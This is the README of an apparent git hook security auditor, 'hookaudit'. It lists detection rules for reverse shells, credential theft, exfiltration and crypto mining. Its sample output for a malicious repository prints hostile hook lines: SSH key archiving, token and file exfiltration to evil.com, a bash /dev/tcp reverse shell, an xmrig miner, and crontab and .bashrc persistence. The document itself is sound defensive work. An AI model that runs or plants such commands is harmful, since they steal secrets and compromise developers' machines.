# hookaudit

**Git Hook & Repository Config Security Auditor**

Scan git hooks, `.gitattributes`, `.git/config`, Husky, pre-commit, and lefthook configs for malicious patterns. Detects reverse shells, credential theft, data exfiltration, obfuscated payloads, crypto miners, and more.

Zero dependencies. Stdlib only. Python 3.8+.

## Why?

Git hooks execute arbitrary code automatically on clone, checkout, commit, merge, and push. Tools exist that **use** hooks for security — but nothing audits the **hooks themselves**.

Attack vectors include:
- **`.git/hooks/post-checkout`** — runs on every `git clone` and `git checkout`
- **`.gitattributes` filter drivers** — execute code on `git checkout` and `git add`
- **`.git/config` fsmonitor** — runs a command on every git operation
- **Husky/pre-commit/lefthook** — hook frameworks that run arbitrary commands
- **`core.hooksPath`** — redirects hooks to a malicious directory

## Install

```bash
# Just copy the script
curl -o hookaudit.py https://raw.githubusercontent.com/kriskimmerle/hookaudit/main/hookaudit.py
chmod +x hookaudit.py

# Or clone
git clone https://github.com/kriskimmerle/hookaudit.git
```

## Usage

```bash
# Scan current repository
python3 hookaudit.py

# Scan a specific repository
python3 hookaudit.py /path/to/repo

# Scan a single hook file
python3 hookaudit.py -f .git/hooks/post-checkout

# JSON output for CI
python3 hookaudit.py --json

# CI mode (exit 1 for HIGH, exit 2 for CRITICAL)
python3 hookaudit.py --ci

# Show all rules
python3 hookaudit.py --rules

# Verbose (include INFO findings)
python3 hookaudit.py -v
```

## What It Scans

| Source | What | Auto-triggered? |
|--------|------|-----------------|
| `.git/hooks/` | Native git hooks | Yes — on clone, commit, push, etc. |
| `.githooks/` | Custom hooks directory | Yes — if `core.hooksPath` is set |
| `.gitattributes` | Filter/diff/merge drivers | Yes — on checkout, add, diff, merge |
| `.git/config` | fsmonitor, credential helper, etc. | Yes — on every git operation |
| `.husky/` | Husky hook scripts | Yes — on commit, push, etc. |
| `.pre-commit-config.yaml` | Pre-commit framework | Yes — on commit |
| `lefthook.yml` | Lefthook framework | Yes — on commit, push, etc. |

## Rules (18)

| Rule | Severity | Description |
|------|----------|-------------|
| HA001 | CRITICAL | Reverse shell patterns (bash, netcat, python, perl, ruby, socat) |
| HA002 | CRITICAL | Credential theft (SSH keys, AWS/GCP creds, keychains, browser data) |
| HA003 | HIGH | Data exfiltration (HTTP POST, DNS tunneling, netcat pipe, scp/rsync) |
| HA004 | CRITICAL | Download and execute (curl\|sh, wget\|sh, download+chmod+x) |
| HA005 | HIGH | Obfuscated code (base64 decode, hex, eval, IFS manipulation) |
| HA006 | CRITICAL | Dangerous commands (rm -rf /, fork bomb, disk overwrite) |
| HA007 | HIGH | Privilege escalation (sudo, su, setuid/setgid) |
| HA008 | CRITICAL | Environment variable exfiltration (secrets piped to network) |
| HA009 | MEDIUM | Background process spawning (nohup, crontab, at, screen/tmux) |
| HA010 | HIGH | Filesystem modification outside repo (shell profiles, /etc, /usr) |
| HA011 | CRITICAL | Crypto mining (miner binaries, stratum pools, mining algorithms) |
| HA012 | HIGH | Gitattributes filter/diff/merge drivers (code execution on checkout) |
| HA013 | HIGH | Dangerous git config (fsmonitor, hooksPath, credential helper) |
| HA014 | — | Husky hook framework scanning |
| HA015 | MEDIUM | Pre-commit config suspicious repos or entries |
| HA016 | — | Lefthook config scanning |
| HA017 | INFO | Hook metadata (auto-triggered hooks, permissions) |
| HA018 | HIGH | Binary content in hook files |

## Example Output

### Clean repository
```
hookaudit — Git Hook Security Audit

  Grade: A+  Risk: SAFE (0/100)
  Files scanned: 1  Hooks found: 0
  Findings: 0

  ✓ No security issues found
```

### Malicious repository
```
hookaudit — Git Hook Security Audit

  Grade: F  Risk: CRITICAL (100/100)
  Files scanned: 1  Hooks found: 1
  Findings: 7

  CRITICAL (4)
    [HA002] Credential theft: SSH key access
      .git/hooks/post-checkout:3
      → tar czf /tmp/keys.tar.gz ~/.ssh/

    [HA011] Crypto mining: crypto miner binary
      .git/hooks/post-checkout:8
      → nohup xmrig --url stratum+tcp://pool.mining.com:3333 &

    [HA008] Environment exfiltration: secret env var sent to network
      .git/hooks/post-checkout:5
      → curl http://evil.com/?token=$GITHUB_TOKEN

    [HA001] Reverse shell pattern detected
      .git/hooks/post-checkout:10
      → bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

  HIGH (2)
    [HA003] Data exfiltration: HTTP POST data exfiltration
      .git/hooks/post-checkout:4
      → curl -X POST -d @/tmp/keys.tar.gz http://evil.com/collect

    [HA010] Filesystem modification: shell profile append
      .git/hooks/post-checkout:7
      → echo 'export PATH=/tmp/evil:$PATH' >> ~/.bashrc

  MEDIUM (1)
    [HA009] Background process: crontab modification
      .git/hooks/post-checkout:6
      → crontab -l | { cat; echo '* * * * * /tmp/backdoor'; } | crontab -
```

## CI Integration

### GitHub Actions

```yaml
- name: Audit git hooks
  run: python3 hookaudit.py --ci
```

Exit codes:
- `0` — No HIGH or CRITICAL findings
- `1` — HIGH findings detected
- `2` — CRITICAL findings detected

### JSON output

```bash
python3 hookaudit.py --json | jq '.findings[] | select(.severity == "CRITICAL")'
```

## Use Cases

- **Audit cloned repos** before running any git commands
- **CI pipeline check** to catch malicious hooks in PRs
- **Security review** of open-source projects before contribution
- **Supply chain audit** of git hook frameworks (Husky, pre-commit, lefthook)
- **Incident response** to check if hooks were tampered with

## Limitations

- Pattern-based detection (no execution/sandboxing)
- Cannot detect novel/zero-day obfuscation techniques
- Does not fetch or analyze pre-commit hook repos (only checks config)
- Local `.git/hooks/` are not synced via git (but `.githooks/`, `.husky/`, and configs are)

## License

MIT
